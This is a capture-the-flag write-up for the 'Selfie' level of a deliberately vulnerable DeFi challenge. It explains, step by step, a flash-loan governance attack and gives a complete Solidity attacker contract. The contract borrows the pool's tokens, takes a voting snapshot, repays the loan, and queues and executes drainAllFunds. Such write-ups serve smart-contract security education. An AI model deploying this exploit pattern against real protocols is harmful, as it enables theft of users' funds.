# Intro

A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

# Attack explanation

Our objective is to take the 1.5m DVT tokens. In order to beat the level, we need to:

1. Ask a loan for more than 1m DVT tokens.
   - We need more than half the supply. Total supply is 2m.
2. When we get our loan, we need to take a new snapshot of the token.
   - So we record that we have more than half the supply of the tokens.
3. After the snapshot is taken, we can repay our loan. We don't need the tokens anymore.
   - We only needed them to be the majority in order to queue an action.
4. Now, we need to queue an governance action that calls drainAllFunds function from selfie pool with our attacker account as receiver of those funds.
5. Once our action is queued, we need to wait at least 2 days in order to execute and effectively drain all funds.

# Attack function

We can create the following attacker contract to make the attack:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title AttackerContractSelfie
 * @author Juan Farber (github.com/Farber98)
 */

contract AttackerContractSelfie {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() external payable {
        // Calls the loan.
        selfiePool.flashLoan(token.balanceOf(address(selfiePool)));

        // Prepare data that we are going to execute on SelfiePool call. This is the drainAllFunds call.
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            msg.sender
        );

        // Queues the drainAllFunds action.
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
    }

    // Function called by selfiePool.
    fallback() external payable {
        // Makes token snapshot with our loaned balance.
        token.snapshot();

        // Repays the loan. We don't need them anymore as we have our snapshot.
        token.transfer(address(selfiePool), token.balanceOf(address(this)));
    }

    function drain() external payable {
        // Drain the funds after the 2 days passed.
        simpleGovernance.executeAction(actionId);
    }
}

```
